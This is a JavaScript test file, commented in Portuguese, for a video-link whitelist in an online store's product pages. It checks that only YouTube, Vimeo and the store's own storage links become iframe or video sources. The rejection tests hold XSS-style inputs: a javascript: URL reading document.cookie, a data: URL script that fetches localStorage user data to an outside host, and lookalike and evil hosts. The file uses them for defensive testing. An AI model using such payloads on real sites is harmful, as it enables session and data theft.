// 🎬 Vídeo no produto — o que entra, e o que a página faz com ele.
//
// PEDIDO (15/09/2026): "ao criar ou editar um produto, também ter a função de
// anexar vídeo ou colocar link de vídeo."
//
// O risco que estes testes existem pra travar não é "o vídeo não aparece". É
// o contrário: o endereço colado por quem cadastra vira `<iframe src>` DENTRO
// da nossa página de venda, e o vercel.json não define CSP nenhuma. Sem lista
// branca, quem tem acesso à Gestão de Estoque escolhe o que roda no navegador
// de quem compra. Por isso a maior parte daqui é sobre RECUSA, não sobre aceite.
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  entenderVideo, recadoDoErro, conferirArquivo, videosValidos, videoDoProduto,
  ehVideoNosso, BALDE_VIDEO, TETO_BYTES, TIPOS_ACEITOS,
} from '../src/lib/videoDoProduto.js';

const ler = (rel) => readFileSync(new URL(rel, import.meta.url), 'utf8');

// 🔍 Fiação se confere no CÓDIGO, não no comentário — senão um cabeçalho que
// explica a regra derruba o teste da regra, e o caminho fácil vira apagar a
// explicação. (Mesma razão de tests/leilaAtendente.test.mjs.)
const semComentarios = (src) => src
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .split('\n').map((l) => l.replace(/\/\/.*$/, '')).join('\n');

describe('o que é aceito', () => {
  test('as quatro formas de link do YouTube que as pessoas realmente colam', () => {
    const casos = [
      'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      'https://youtu.be/dQw4w9WgXcQ',
      'https://www.youtube.com/embed/dQw4w9WgXcQ',
      'https://www.youtube.com/shorts/dQw4w9WgXcQ',
    ];
    for (const url of casos) {
      const r = entenderVideo(url);
      assert.equal(r.ok, true, `recusou ${url}`);
      assert.equal(r.tipo, 'youtube');
      assert.equal(r.embed, 'https://www.youtube.com/embed/dQw4w9WgXcQ', `embed errado para ${url}`);
    }
  });

  test('o endereço guardado é o que a pessoa colou, não o embed', () => {
    // Se um dia a forma do embed mudar, o original ainda é recuperável.
    const colado = 'https://youtu.be/dQw4w9WgXcQ';
    assert.equal(entenderVideo(colado).url, colado);
  });

  test('parâmetro a mais no link não atrapalha (é como o YouTube compartilha)', () => {
    const r = entenderVideo('https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s&list=PLxyz');
    assert.equal(r.ok, true);
    assert.equal(r.embed, 'https://www.youtube.com/embed/dQw4w9WgXcQ');
  });

  test('youtu.be com query também entende', () => {
    assert.equal(entenderVideo('https://youtu.be/dQw4w9WgXcQ?t=10').embed,
      'https://www.youtube.com/embed/dQw4w9WgXcQ');
  });

  test('Vimeo vira player do Vimeo', () => {
    const r = entenderVideo('https://vimeo.com/76979871');
    assert.equal(r.tipo, 'vimeo');
    assert.equal(r.embed, 'https://player.vimeo.com/video/76979871');
  });

  test('arquivo do nosso Storage é tipo `arquivo` e toca sem iframe', () => {
    const url = `https://gezvviyegtxytnwjkrjv.supabase.co/storage/v1/object/public/${BALDE_VIDEO}/ps5.mp4`;
    const r = entenderVideo(url);
    assert.equal(r.ok, true);
    assert.equal(r.tipo, 'arquivo');
    assert.equal(r.embed, url, 'o arquivo nosso não pode ser reescrito');
    assert.equal(ehVideoNosso(url), true);
  });

  test('espaço em volta do link não reprova ninguém', () => {
    assert.equal(entenderVideo('  https://vimeo.com/76979871  ').ok, true);
  });
});

describe('🔴 o que NÃO entra, e é o motivo desta lista existir', () => {
  test('host desconhecido é recusado, mesmo parecendo vídeo', () => {
    for (const url of [
      'https://exemplo.com.br/video.mp4',
      'https://cdn-qualquer.net/embed/abc',
      'https://youtube.com.invasor.net/watch?v=abc',   // sufixo colado no host
      'https://vimeo.com.br/76979871',
    ]) {
      const r = entenderVideo(url);
      assert.equal(r.ok, false, `ACEITOU host de fora: ${url}`);
      assert.equal(r.motivo, 'host_nao_permitido');
    }
  });

  test('javascript: e data: não passam — é o clássico do iframe', () => {
    for (const url of [
      'javascript:alert(document.cookie)',
      'data:text/html,<script>fetch("https://fora/"+localStorage.currentUser)</script>',
    ]) {
      assert.equal(entenderVideo(url).ok, false, `ACEITOU ${url}`);
    }
  });

  test('outro balde do mesmo Supabase não vira vídeo de produto', () => {
    // xgame-videos é cofre de ritual, privado. Se colasse aqui, a página de
    // venda tentaria tocar gravação íntima de vendedor.
    assert.equal(ehVideoNosso('https://gezvviyegtxytnwjkrjv.supabase.co/storage/v1/object/public/xgame-videos/a.mp4'), false);
  });

  test('host que só TERMINA em supabase.co de terceiro não é nosso por acaso', () => {
    // O `endsWith` casa com qualquer projeto do Supabase — mas o caminho
    // precisa ser o nosso balde, e não existe balde nosso na conta de outro.
    assert.equal(ehVideoNosso('https://outroprojeto.supabase.co/storage/v1/object/public/outro/a.mp4'), false);
  });

  test('vazio, nulo e lixo caem em motivo próprio, sem lançar', () => {
    assert.equal(entenderVideo('').motivo, 'vazio');
    assert.equal(entenderVideo(null).motivo, 'vazio');
    assert.equal(entenderVideo(undefined).motivo, 'vazio');
    assert.equal(entenderVideo({}).motivo, 'vazio');
    assert.equal(entenderVideo('   ').motivo, 'vazio');
    assert.equal(entenderVideo('não é link nenhum').motivo, 'endereco_invalido');
  });

  test('cada motivo tem uma frase em português, sem jargão', () => {
    for (const m of ['vazio', 'endereco_invalido', 'protocolo_nao_permitido', 'host_nao_permitido']) {
      const frase = recadoDoErro(m);
      assert.ok(frase.length > 15, `motivo ${m} sem frase`);
      assert.ok(!/URL|host|protocolo n|iframe|MIME|CSP/i.test(frase.replace('https://', '')),
        `a frase do motivo ${m} tem jargão: ${frase}`);
    }
    assert.ok(recadoDoErro('inventado_agora').length > 10, 'motivo novo ficou sem frase');
  });
});

describe('o arquivo, antes de subir', () => {
  const arquivo = (type, size) => ({ type, size, name: 'v' });

  test('os três formatos do balde passam', () => {
    for (const t of TIPOS_ACEITOS) assert.equal(conferirArquivo(arquivo(t, 1024)).ok, true, t);
  });

  test('formato de fora é recusado ANTES do upload', () => {
    // Recusar aqui é o que evita a pessoa esperar 40 MB subirem pra o Storage
    // devolver erro no fim.
    for (const t of ['video/x-matroska', 'image/png', 'application/pdf', '']) {
      assert.equal(conferirArquivo(arquivo(t, 1024)).ok, false, t);
    }
  });

  test('o teto fica ABAIXO do balde — o corpo da requisição é maior que o vídeo', () => {
    assert.ok(TETO_BYTES < 50 * 1024 * 1024, 'o teto encostou no limite do balde');
    assert.equal(conferirArquivo(arquivo('video/mp4', TETO_BYTES)).ok, true, 'recusou exatamente no teto');
    assert.equal(conferirArquivo(arquivo('video/mp4', TETO_BYTES + 1)).ok, false, 'aceitou acima do teto');
  });

  test('quando recusa por tamanho, diz o tamanho e o que fazer', () => {
    const r = conferirArquivo(arquivo('video/mp4', 90 * 1024 * 1024));
    assert.match(r.recado, /90 MB/);
    assert.match(r.recado, /45 MB/);
  });

  test('sem arquivo não explode', () => {
    assert.equal(conferirArquivo(null).ok, false);
    assert.equal(conferirArquivo(undefined).ok, false);
  });
});

describe('o que chega no banco', () => {
  test('videosValidos joga fora o que não presta e mantém a ordem', () => {
    assert.deepEqual(
      videosValidos(['https://vimeo.com/1', 'https://invasor.net/x', 'https://youtu.be/abc']),
      ['https://vimeo.com/1', 'https://youtu.be/abc'],
    );
  });

  test('não grava o mesmo vídeo duas vezes', () => {
    assert.deepEqual(videosValidos(['https://vimeo.com/1', 'https://vimeo.com/1']), ['https://vimeo.com/1']);
  });

  test('lista ausente ou estragada vira lista vazia, nunca erro', () => {
    for (const lixo of [null, undefined, 'texto', 42, {}]) {
      assert.deepEqual(videosValidos(lixo), [], JSON.stringify(lixo));
    }
  });

  test('🔴 o filtro da gravação é o MESMO da tela — não dá pra contornar pela API', () => {
    // Se a validação só existisse no <input>, bastava chamar a entidade direto
    // pra gravar javascript: no campo. `videosValidos` roda na gravação.
    assert.deepEqual(videosValidos(['javascript:alert(1)', 'https://evil.io/a.mp4']), []);
  });
});

describe('o que a página de venda toca', () => {
  test('pega o primeiro tocável, pulando o quebrado', () => {
    const r = videoDoProduto({ video_urls: ['https://invasor.net/x', 'https://vimeo.com/7'] });
    assert.equal(r.tipo, 'vimeo');
  });

  test('produto sem vídeo devolve null — o player some inteiro', () => {
    for (const p of [null, {}, { video_urls: [] }, { video_urls: ['https://invasor.net/x'] }]) {
      assert.equal(videoDoProduto(p), null, JSON.stringify(p));
    }
  });
});

describe('a fiação — sem ela a feature existe só no papel', () => {
  test('🔴 `video_urls` está na lista branca da rota de gravação', () => {
    // Campo fora do ALLOWED de productAdminAction some CALADO. Já aconteceu
    // três vezes documentadas (category_id, condicao, estado_conservacao): a
    // tela mostra "salvo", o banco não recebe, e ninguém descobre.
    const rota = semComentarios(ler('../api/functions/productAdminAction.js'));
    assert.match(rota, /'video_urls'/);
  });

  test('o upload consegue escolher o balde — antes era `public-assets` fixo', () => {
    const ad = semComentarios(ler('../src/api/plataformaAdapter.js'));
    assert.ok(!/const bucket = 'public-assets';/.test(ad),
      'o balde voltou a ser literal — vídeo cairia no balde de imagem');
    assert.match(ad, /UploadFile\(\{ file, path, bucket: baldePedido \}\)/);
  });

  // 15/09/2026 — o campo saiu de dentro da Gestão de Estoque e virou componente
  // quando as telas de catálogo passaram a precisar dele. São TRÊS telas que
  // gravam na mesma coluna: se a regra do que é vídeo válido morar em três
  // lugares, ela diverge, e a que divergir grava endereço que some calado no
  // navegador de quem compra.
  const TELAS_QUE_CADASTRAM = [
    ['Gestão de Estoque',        '../src/pages/ProductManagement.jsx',  'formData.video_urls'],
    ['Adicionar ao catálogo',    '../src/pages/AddCatalogProduct.jsx',  'formData.video_urls'],
    ['Editar produto do catálogo','../src/pages/EditCatalogProduct.jsx', 'videoUrls'],
  ];

  test('o campo de vídeo é UM só, e é ele que sobe pro balde do vídeo', () => {
    const campo = semComentarios(ler('../src/components/catalog/CampoDeVideo.jsx'));
    // sobe pro balde do vídeo, não pro de imagem
    assert.match(campo, /UploadFile\(\{ file, bucket: BALDE_VIDEO \}\)/);
    // confere tipo e tamanho ANTES de subir
    assert.match(campo, /conferirArquivo\(file\)/);
    const posConferencia = campo.indexOf('conferirArquivo(file)');
    assert.ok(posConferencia > 0 && posConferencia < campo.indexOf('UploadFile('),
      'a conferência precisa vir ANTES do envio, senão sobe 40 MB pra ser recusado no fim');
    // e quem decide o que é link válido continua sendo a lista branca
    assert.match(campo, /entenderVideo\(link\)/);
  });

  for (const [nome, caminho, origem] of TELAS_QUE_CADASTRAM) {
    test(`${nome}: usa o campo único e grava pelo filtro`, () => {
      const tela = semComentarios(ler(caminho));
      // `\s` no fim de propósito: sem ele, `<CampoDeVideoQualquerCoisa` passaria.
      assert.match(tela, /<CampoDeVideo\s/, 'a tela não mostra o campo de vídeo');
      assert.match(tela, /import CampoDeVideo from '@\/components\/catalog\/CampoDeVideo'/,
        'a tela não importa o campo único');
      assert.match(tela, new RegExp(`video_urls: videosValidos\\(${origem.replace('.', '\\.')}\\)`),
        'a tela grava o que a pessoa digitou sem passar pelo filtro');
      // não reimplementa o envio por fora do componente
      assert.ok(!/UploadFile\(\{ file, bucket/.test(tela),
        'a tela voltou a subir vídeo por conta própria, fora do campo único');
    });
  }

  test('editar carrega o vídeo já gravado — senão salvar apagaria', () => {
    // as três telas gravam o pacote inteiro; se não carregarem o que já existe,
    // abrir o produto e salvar qualquer outro campo esvazia a coluna.
    const casos = [
      ['../src/pages/ProductManagement.jsx',   /video_urls: Array\.isArray\(product\.video_urls\)/],
      ['../src/pages/AddCatalogProduct.jsx',   /video_urls: Array\.isArray\(product\.video_urls\)/],
      ['../src/pages/EditCatalogProduct.jsx',  /setVideoUrls\(Array\.isArray\(currentProduct\.video_urls\)/],
    ];
    for (const [caminho, padrao] of casos) {
      assert.match(semComentarios(ler(caminho)), padrao, caminho);
    }
  });

  test('🔇 o player não toca sozinho nem faz barulho na vitrine', () => {
    const player = semComentarios(ler('../src/components/catalog/PlayerDeVideo.jsx'));
    assert.ok(!/autoplay|autoPlay/.test(player), 'voltou o autoplay na página de venda');
    assert.match(player, /controls/);
    assert.match(player, /preload="metadata"/);
  });

  test('o player decide a tag pelo `tipo` da lista branca, nunca por conta própria', () => {
    const player = semComentarios(ler('../src/components/catalog/PlayerDeVideo.jsx'));
    assert.match(player, /videoDoProduto\(produto\)/);
    assert.match(player, /video\.tipo === 'arquivo'/);
    // o src sai do `embed` — usar a url crua no iframe reabriria o buraco
    assert.ok(!/src=\{video\.url\}/.test(player), 'o player voltou a usar a url crua');
  });

  test('as DUAS portas da loja mostram o vídeo do produto', () => {
    // 🔄 17/09/2026 — ESTE TESTE CASAVA COM O TEXTO, NÃO COM A REGRA.
    //
    // Ele exigia literalmente `<PlayerDeVideo produto={product} />`. A #386-b
    // moveu o vídeo do bloco solto embaixo da foto para DENTRO da fileira de
    // mídias do carrossel (pedido do dono), e o casamento caiu — embora a
    // propriedade protegida seguisse inteira.
    //
    // A propriedade é: QUEM ABRE O PRODUTO CONSEGUE VER O VÍDEO. Agora ela vale
    // para as duas portas da Loja: a página de link compartilhado E o modal que
    // o card de destaque abre (que antes não tinha vídeo nenhum). Casar com a
    // fiação — fileira montada e fileira desenhada — protege a regra sem
    // depender de como a tag se chama.
    for (const arq of ['../src/pages/CatalogProductDetails.jsx',
                       '../src/components/catalog/ProductDetailsModal.jsx']) {
      const tela = semComentarios(ler(arq));
      // 🔴 `const midias =`, não só a menção ao nome. Sem amarrar na ATRIBUIÇÃO,
      // uma outra linha do arquivo que chame `midiasDoProduto` (a contagem das
      // setas, por exemplo) já faz o casamento passar enquanto a galeria
      // desenhada volta a ser só de fotos. Medido: a mutação passou VERDE assim.
      assert.match(tela, /const midias = midiasDoProduto\(product\)/, `${arq} não monta a fileira de mídias`);
      assert.match(tela, /<QuadroDeMidia\s+midia=\{midiaAtual\}/, `${arq} não desenha a mídia da vez`);
    }
  });

  test('a migração cria a coluna e o balde com os mesmos limites do código', () => {
    const sql = ler('../supabase/migrations/20260915132423_video_do_produto.sql');
    assert.match(sql, /add column if not exists video_urls jsonb/);
    assert.match(sql, new RegExp(`'${BALDE_VIDEO}'`));
    assert.match(sql, /52428800/, 'o teto do balde mudou sem o código saber');
    for (const t of TIPOS_ACEITOS) {
      assert.ok(sql.includes(`'${t}'`), `o balde não aceita ${t}, mas o código deixa escolher`);
    }
  });
});

describe('a importação por planilha também traz vídeo', () => {
  const rota = semComentarios(ler('../api/functions/bulkImportProducts.js'));
  const tela = ler('../src/components/catalog/PlanilhaImport.jsx');

  test('a coluna de vídeo chega no banco', () => {
    assert.match(rota, /video_urls: videos/);
  });

  test('🔴 e passa pela MESMA lista branca do cadastro manual', () => {
    // Sem isto a planilha vira a porta dos fundos: o que a tela recusa
    // entraria em lote, sem ninguém olhar linha por linha.
    assert.match(rota, /videosValidos\(brutosVideo\)/);
    assert.match(rota, /from '\.\.\/\.\.\/src\/lib\/videoDoProduto\.js'/);
  });

  test('a planilha aceita vários endereços na mesma célula, como já faz com foto', () => {
    assert.match(rota, /String\(it\.videos\)\.split/);
  });

  test('🔴 a coluna de vídeo é detectada ANTES da de imagem', () => {
    // `detectField` casa por SUBSTRING e 'url' é alias de imagem. Se `images`
    // viesse primeiro, o cabeçalho "URL do vídeo" seria lido como coluna de
    // foto — e o vídeo apareceria quebrado na galeria em vez de tocar.
    const iVideo = tela.indexOf('  videos: [');
    const iImagem = tela.indexOf('  images: [');
    assert.ok(iVideo > 0 && iImagem > 0, 'sumiu um dos dois dicionários');
    assert.ok(iVideo < iImagem, 'images voltou a ser detectada antes de videos');
  });

  test('a tela manda a coluna, oferece o mapeamento e o modelo tem a coluna', () => {
    assert.match(tela, /videos: mapping\.videos \? r\[mapping\.videos\] : null/);
    assert.match(tela, /videos: 'Vídeo \(link\)'/);
    assert.match(tela, /'Imagem', 'Vídeo', 'Observação'/);
  });
});
